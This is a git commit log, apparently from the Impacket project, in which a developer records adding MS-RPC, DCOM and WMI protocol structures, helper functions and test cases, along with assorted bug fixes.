commit 925e3f80776fbe96b34d880440d9ef907e4d6b42
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Apr 5 16:10:59 2014 +0000

    Setting up a high timeout for requests

commit 4ffcdf840c1337e53451abed2515acca2ff3bb3c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Apr 5 01:47:54 2014 +0000

    [WMI-IO] is ugly.. but anyways.. almost there.. There are some errors triggered that I still gotta find the solution for.
    the updated testcase output is promising :)

commit f651ad06cef4b6ffe429c0085f45432761e67015
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 23:56:25 2014 +0000

    Adding the [MS_WMIO] part

commit d6c7c28f2c5065807a0cf83be1f8882cb151cfc5
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 21:11:56 2014 +0000

    test cases for wmi.py

commit d9a9cbbd7923fdee76b85c79f6a1f4afb97f9b29
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 21:10:41 2014 +0000

    [MS-WMI], just starting

commit b4461fa7bdeb8775aa63cf835a626d2812e28bbb
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 19:23:40 2014 +0000

    INTERFACE.process_interface(): iPid and Oxid is not present inside a OBJREF_CUSTOM

commit 4d1eb6191e1a08931486d528f7a79f0336d28bea
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 19:12:55 2014 +0000

    Adding PPMInterfacePointer()

commit 12570727931db2b1854728c37f7c927506c583bd
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 17:02:09 2014 +0000

    When calling alter_ctx we must update the ctx for the subsequent calls

commit df25a527624d30b917cbc50cef2a783dab1c5354
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 16:48:49 2014 +0000

    Fixed wrong constant value for DOMAIN_GROUP_RID_CONTROLLERS

commit 7e2f8a437156e417937ad28ad80d72839bebcd80
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 15:01:43 2014 +0000

    Added 2.2.32 LPCSTR

commit 78fb61599b2db8c8c4976764fc13afb7e3efabd5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 1 18:58:56 2014 +0000

    Just changing some variable names

commit 2e91ea1e1674a86b7e907c06af15e1c281d6f4ec
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 1 18:57:56 2014 +0000

    Added:
    1) IDispatch::GetIDsOfNames()
    2) IDispatch::Invoke()
    3) ITypeInfo::GetNames()
    4) ITypeInfo::GetTypeComp()

commit 3cb52bcae189e09d5547c86c39c15ecdb348889e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 1 14:19:29 2014 +0000

    Added:
    1) SamrLookupNamesInDomain/hSamrLookupNamesInDomain
    2) SamrLookupIdsInDomain/hSamrLookupIdsInDomain
    
    Test cases also included

commit 18b92f63f4ae04c9ded1f38d25cb895ec3578752
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 29 23:53:10 2014 +0000

    fromStringReferents() and fromStringReferent() now returns the amount of bytes they consumed. This makes it easier to update where we are reading at the packet buffer, instead of calling getDataReferent/s() methods, saving some time and making it more efficient.

commit 43df600cec844470ace66905f507f102f78b2ed2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 28 20:55:07 2014 +0000

    Added ability to not align an Union in between the tag and the data itself. This is not the ideal solution, but I can't understand how pads are calculated there. More research needed, but for now the dcom runtime is back working.

commit 88e72104ae7db9fde13c13bd3646e67a092597d3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 28 19:25:43 2014 +0000

    Reverting the change in alignment I did before. It breaks my test cases (just figured when dumping the responses), but reverting back brings other problems to the dcomrt. So... everything works except dcom, which is brand new.. so can't be still used until I figure things out.

commit 7e23ae31b009a658a728c92401020bc998df5b5e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 28 19:24:17 2014 +0000

    Comenting one request that doesn't work (was commented before)

commit d8da122268142ae7c05bb8b31c7e9ac121d564a0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 28 19:20:01 2014 +0000

    Uncommented all the dump() calls. This is an extra check to verify the data comes/is parsed the right way.
    
    When running these testcases, save the output to a file (or /dev/null) so you can see the normal test case output

commit 1de7787b0d2a6c73b0a7b5401a0741aefc156b66
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 27 15:50:35 2014 +0000

    1) Added 'default' clause for NDRUNIONs
    2) Changed the alignment calculations for NDR32 in NDRUNIONS

commit b2155a2eef33273e4d70aaf1326b240f77cb0a2b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 23:54:19 2014 +0000

    1) Added ITypeInfo::GetFuncDesc()
    2) Finished ITypeInfo::GetTypeAttr()

commit 5bdc9cb3a0ede74af566ae13563a7113bbdd9c04
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 23:53:02 2014 +0000

    We don't want an extra CRLF when dumping enums

commit 376efb9462255275ec9e8cb96972d39c40c63ea6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 23:01:39 2014 +0000

    RemoteGetClassObject() now returns an IRemUnknown2

commit 669813e55d830bd9b68da4e82d74536801960bdb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 22:53:16 2014 +0000

    Bye

commit b25baab9cd7077d30dc28c195e3aaf31f5e746e6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 22:53:00 2014 +0000

    Added test case for RemoteGetClassObject()

commit 9e03d5d3cf66caca6790ac145814e243f13c4ee3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 22:51:44 2014 +0000

    RemoteGetClassObject() now working

commit f50c86d9930e304646824aaa6f0ff7ce02b794fc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 19:33:57 2014 +0000

    New name, since we changed the module as well

commit 72ab89dccba6897f489e9e09702dac1f9ad2e236
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 19:33:25 2014 +0000

    Test cases more organized.. only using the helper classes/methods

commit 80265aa1c9da1916f031f9e369c1dfdb7882df29
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 19:20:56 2014 +0000

    1) self.__marshalled_iid not needed anymore.
    2) fixed IIDs in comev

commit 358f82afd6d001368ee886f25e929bb205e49e6b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 18:50:40 2014 +0000

    1) Added IObjectExporter::ResolveOxid(), IObjectExporter::SimplePing(), IObjectExporter::ComplexPing(), IObjectExporter::ServerAlive(), IObjectExporter::ResolveOxid2(), IObjectExporter::ServerAlive2()
    2) Added IActivation::RemoteActivation()
    3) Added IRemoteSCMActivator::RemoteGetClassObject(): Still not working

commit 2847a229267bb460efb1b7af36e780207de8ca9e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 18:45:56 2014 +0000

    Moved some definitions into the class constructors in order to get away the forward reference need

commit 2b4b6c5be0c60c6420db60a0f25ff2d8523b691d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 00:37:06 2014 +0000

    Added targetIP to the INTERFACE constructor. This is needed for now, when parsing the stringBindinds in order to connect to the right machine

commit eb94713d28584cb99b50c736705b34f64845928d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 00:36:11 2014 +0000

    Added get_rpc_transport()

commit 9023cfd7046cc3b338535e91836e0afeb197c1f4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 22:23:58 2014 +0000

    Adding dcom directory to the install path

commit c31b00a7407410bdb8515e9e3faec90c739c2c62
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 22:22:54 2014 +0000

    Stuff with various test cases while I develop the dcom runtime

commit 28cbc46779011d5c56937d5a00bdfc7f67e5dd39
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 22:19:59 2014 +0000

    Bye

commit 388c8fd730bc061348de5ae22b62eb4045131d9d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 22:19:07 2014 +0000

    DCOM Interfaces implemented (not complete).. Further testing needed, still way to go

commit 16c2781cbc2fe415591977a54aa54ec1f6c27573
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 22:15:31 2014 +0000

    If it cannot find the module in the current directory, try the subdirectories

commit 70c75f245984909e232378e027dd08e9c3535dea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 21:56:40 2014 +0000

    Moving it to a different name. DCOM runtime

commit 7a69be9bb22b4410b5afcb5a2b0fcb4e1021e251
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 21:36:59 2014 +0000

    More data types added

commit 55faa58b91e2b2ced18aa0256ed3c07940da0d7b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 22 04:20:29 2014 +0000

    1) More dcom stuff
    2) added BSTR to dtypes

commit 44aafc96d933a121ce8d1451ec1ed6c3231a8445
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 21 19:35:48 2014 +0000

    Added an extra check trying to find the right error code when something goes wrong

commit 1d2a92e181d8ed1e72157f3eee7c8705df6fb420
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 21 19:35:03 2014 +0000

    Adding SHORT type

commit c96c2c08749a548fba869f2d870b3126ec95f580
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 21 14:49:10 2014 +0000

    Fixed bug in getServiceAccount() method. It wasn't using the parameter received pointing to the serviceName to get the running user from, instead it was using self.__serviceName!

commit acc0d50ae130c2c2409cdcd4798452ff6966c793
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 20 21:34:34 2014 +0000

    more stuff on the DCOM saga.. still way behind doing something useful.. but getting closer

commit 6d04c633259124e7e2a485afc369b397ca00122a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 18 15:18:21 2014 +0000

    1) Added ability to specify an UUID inside the RPC Header (needed for DCOM)
    2) Whenever there's an RPC Error, it will look at HRESULT errors when printing the exception

commit e0ba0fb3b856b335947022a005b87ddb3863dac2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 18 15:16:54 2014 +0000

    HRESULT Errors from [MS-ERREF].

commit f631e988934d8ca1d67bf58e2c0f691ecbe084ff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 18 15:15:22 2014 +0000

    Added LONGLONG

commit 31b4fac3a448cbd67f4ce5a8a9650ba936842c05
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 8 16:48:26 2014 +0000

    Adjusting some data types

commit b5140ea1261ea64a21d570c3dd36e6aa71d82734
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 4 19:00:45 2014 +0000

    Fix for https://code.google.com/p/impacket/issues/detail?id=39. Under Windows 2000, the NoLMHash registry key does not exist, and we weren't catching an exception under that situation. Should work now.

commit b262d7e8747a7e10390789525f6e4b9101db3db0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 27 19:33:36 2014 +0000

    Fixed typo in hSamrEnumerateUsersInDomain(), the userAccountControl parameter was not being included in the DCE call

commit 35c4edbc74dbceadc708a3abff82380afaa2135a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 26 16:20:19 2014 +0000

    Fix for https://code.google.com/p/impacket/issues/detail?id=38&thanks=38&ts=1393431491
    
    The lpClassIn buffer must be completed both at the MaximumCount and MaximumLength level, in order to work on WinXP

commit ddf21422925b068aa2519117b7e9e0cca6b7e09a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 20 16:06:30 2014 +0000

    Added some try: except: clauses when parsing ntds.dit, since based on feedback from a user, when dumping a huge amount of accounts (over 1MM) there are some rows that might be corrupted, hence triggering a decoding error. This fix will report that problem and let the script to continue running.

commit bcfcf50ccdff1f3e165801b629c4d7dc59a16c02
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 17 20:27:11 2014 +0000

    Sync with CORE internal repository

commit 79442b597d1dbd30057f3a45b90fd619af750788
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 17 20:23:22 2014 +0000

    Sync with CORE internal repository

commit d806d50191a0a97c8bc17b8779caf9315d1621b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 17 17:56:43 2014 +0000

    Sync with CORE internal repository

commit f7d9b6bbe6bdd1baa66febedd9f9fcadcefd5d4c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 12 16:39:51 2014 +0000

    If we cannot open the SCMR, let's raise an exception so the target file uploaded is removed

commit 12202d942e9e1c488ff0c6e69ea546220890eb8f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 11 15:13:03 2014 +0000

    Whenever we detect the target system has signature required, we print a warning message stating the attack will fail

commit eb07deaf0ddb21ce990a24376b0bbba0aa780bb7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 3 16:19:04 2014 +0000

    Updated home URL

commit 0a230f6097c8ab7fb1adebf505a12e28b8eac544
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 3 15:52:45 2014 +0000

    Typo at ScmReplyInfoData()

commit 5800faa508d9654ab1dae5b0a01f17184c239a3b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 3 02:28:10 2014 +0000

    Replacing evals() with getattr() :)

commit a5c52d22a9391cbb530b307b730c068efad56562
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 2 20:45:10 2014 +0000

    dcom test cases so far

commit cf101a0c378780ba4c340693f2b58ca72ebeb409
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 2 20:44:43 2014 +0000

    [MS-DCOM] Interface Implementation, just starting, way long to go.

commit 6b9d77576cdc5e1984432b73b054c564f28c0f0a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 2 20:41:25 2014 +0000

    Forgot to marshal the referents for the Type1Serialization

commit 65049cdd1614f9140ca586716fa3fd8d2125a142
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Feb 1 18:06:37 2014 +0000

    Adding [MS-RPCE] 2.2.6 Type Serialization Version 1

commit d970afc2fe558f56adeb59f9da89320e5d5a4e54
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Feb 1 18:04:33 2014 +0000

    Adding HRESULT

commit 0cb3ac833c2feefac3569e57dbb85a0c52821c42
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 30 17:00:04 2014 +0000

    We're adding the UDP Transport back.. not yet fully functional

commit f81e61a94520680b35e237ce0ec7ff6c27d222dc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 30 16:59:20 2014 +0000

    Moving to next version 0.9.12-dev

commit 0d7f0f2710f16537c80b7679f75f0af3650e87f2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 22:01:46 2014 +0000

    We'll be storing testcases inside /usr/share/doc/impacket

commit d04394011056e1c99c4faefef105f7ea769f83ea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 21:00:37 2014 +0000

    Adding testcases to the source distribution

commit fbef39b5ef354e4b6b604a0298a81376a5519c7e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 20:22:33 2014 +0000

    Added setSessionKey(), we'll need it in the near future

commit 439791f587d58cfb5903956a853ed7d9f197f711
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 19:58:16 2014 +0000

    SMBConnection.listShares() ported to the new rpcrt

commit 5e31023011b49da2699a2eb6621d7053f15a5523
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 19:38:32 2014 +0000

    Another place to find ordereddict just in case it's not present

commit 42eb8721fca32b39004f56e02d5fe6cd38be405f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 19:00:46 2014 +0000

    Added experimental for some features

commit cb1b2e5a8bf51bdf61b5305a6ade8b9b38f7025b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 17:51:05 2014 +0000

    minor changes

commit 40b9cfab1e12c4ec211ede68a3936cf23edb7524
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 17:41:25 2014 +0000

    Typo with numberings

commit 7b6a75d913d686330fff041e5022d0ab30a69bab
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 17:40:19 2014 +0000

    Updated changelog

commit 9d504f8b5c486714a2c4e69d680bad623f05f90c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 14:24:59 2014 +0000

    No need to declare ndr.*

commit 753ca996807cead7e696c00d13abc952e8517056
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 25 22:38:46 2014 +0000

    Updated

commit a92d9dfa01db679fcf085bc7ff480b9b41459224
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 25 19:04:39 2014 +0000

    Wrong array set.. defaulting to RPC_UNICODE_STRING

commit 1d487efd944e296bdeb35bd444abe0a70c63adb6
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 25 18:38:23 2014 +0000

    1) Added more helper functions
    2) Checking whether NULL strings were sent to the helper functions

commit bf681a5ada6c018a37913fc9302b7863a64b3ec2
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 25 17:47:06 2014 +0000

    Adding LOCALTransport()

commit e2c10ac619c1bae5cb73bba6575f349aea2438e5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 22 20:08:04 2014 +0000

    dcerpc.v5 must be installed

commit 6fc2a346facc69fe01209034075fc7dc91b1b5bd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 21 20:58:34 2014 +0000

    ntfs-read: stripping CRLF
    registry-read: forgot #!/usr/bin/python at the beginning

commit 0aa53f2175d1335f7431b7ad2824487512125a89
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 21 20:46:43 2014 +0000

    In preparation for new version

commit 4f522b22d0afd1e5e73c788de11c87f84a83e5ec
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 21 20:45:51 2014 +0000

    Stripping CRLF

commit 3f2237c3fa658331c13a1806b864fa07e78023b1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 21 20:40:06 2014 +0000

    Not needed anymore

commit 8763dbb2fa26d7c0e2f1927a122c6c28ed8dc359
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 21 19:44:16 2014 +0000

    Cosmetic changes

commit cbd52b52efb71862c13834b3b67c351ff31f2d10
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 20 14:13:58 2014 +0000

    test cases updated

commit eccfeb32cfd1abcd75f605a4c3a89f054c75f89b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 19 14:25:32 2014 +0000

    Ported to the new RPC runtime

commit 349116e6960275079d4dc753ffa833351ca3ef4b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 19 14:17:01 2014 +0000

    Notes added

commit bf1f93000a9f40c61e5c8377d9f25d5fa4d08050
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 19 13:56:06 2014 +0000

    Added checkNullString() to some helper functions to make it easier for the caller to consume them

commit b444686f028acbc6a2b7da585d5341af3658b50c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 19 13:55:08 2014 +0000

    Some helper functions added for nrpc

commit ec0ccde4985d143bd4d5c9c3b1b273fd8b807ecf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 15 15:14:46 2014 +0000

    Helper functions for wkst + updated testcases

commit 62de6d31c2e072a94c1ab428bcc678205fc13319
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 15 03:21:05 2014 +0000

    1) helper functions added
    2) smbclient updated to use the helper functions

commit 850b6c7e3b8a7f5f344b4478117256335009038e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 14 22:15:30 2014 +0000

    Migrated to the helpers I just committed

commit 18fde7133d7c2329a858a7bf29187264bd64f68c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 14 22:08:43 2014 +0000

    Helper functions!

commit 94227f56a1bc9ed58f3efd7dc2acade54d83e5d4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 14 18:55:39 2014 +0000

    Helper functions for LSAT

commit 34451db6b8ab07967215688b9d62028cedbc4d53
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 14 17:12:31 2014 +0000

    Helper functions in place.. done!

commit 7ce38023e8a70d995c58ff9b16140b29d4d57f97
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 14 01:38:30 2014 +0000

    1) [MS-RRP] finished.. just need the helper functions
    2) Added another derefference to ndr setitem to help setting NULL pointers for RPC_UNICODE_STRING like structs

commit b568b5ada2b7cfe6729c640e7f931a082f916dfe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 13 15:26:42 2014 +0000

    More work on RPC_UNICODE_STRING

commit 3bf1172426be13b8c0c1e72aa723276329cf720a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 13 15:26:01 2014 +0000

    SAMPR_ULONG_ARRAY was wrongly defined

commit fce7bafadde72b567cd8dc733b86ff554ffd88f9
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 19:27:07 2014 +0000

    [MS-RRP] Interface Implementation. Not yet finished

commit abe6deddb89cbe4d3a92c488133a18789a2d3a5b
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 18:40:15 2014 +0000

    RPC_UNICODE_STRING() dump method is actually needed :s

commit b177e2b6bc955394b88ecae7864f97da5996c6fa
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 18:04:34 2014 +0000

    A much simpler RPC_UNICODE_STRING

commit 1d6263f59d4213ac3b7b66b39f54aec2538b1567
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 17:39:22 2014 +0000

    NDRBOOLEAN now prints True, False when dumping its contents

commit 35fe0f3ab4c3e45e0de9b06579faf73779b00156
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 16:04:21 2014 +0000

    Adding some more data types

commit a3fc72eeaafe7955dfc33a51b99efaabf3cfc25f
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 13:38:58 2014 +0000

    Moving the SMB-RPC test cases to a different directory

commit df18d1b0427c0d43bd6814636b7f6505e1f726f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 00:14:14 2014 +0000

    Added OPNUMS dictionaries

commit ed8aae1deadb585256c9d87407c3a6776c80c5b0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 22:27:02 2014 +0000

    Forgot to comment the tracebacks

commit 041c53a0f77084a4baca91d1ef896166f23432e7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 22:21:13 2014 +0000

    Migrated to the new RPC Runtime

commit d23a5aa6685e891bed0af40b46e3ac06415bf8a3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 21:53:59 2014 +0000

    Not needed anymore

commit aef50c4edd28c6d979dd49665ee43b108d64143a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 21:51:47 2014 +0000

    Adapted to the new RPC runtime

commit 258481c96bc4cdbbd69323d4dd8e6af0409b3ed0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 16:29:15 2014 +0000

    Updated test case + fix response structure for NetrUseEnum()

commit f650500fadbc5f4dba7cc64317e5424a14e25a3b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 15:30:00 2014 +0000

                # The RPC server MUST ensure that the RPC_C_AUTHN_NETLOGON security provider
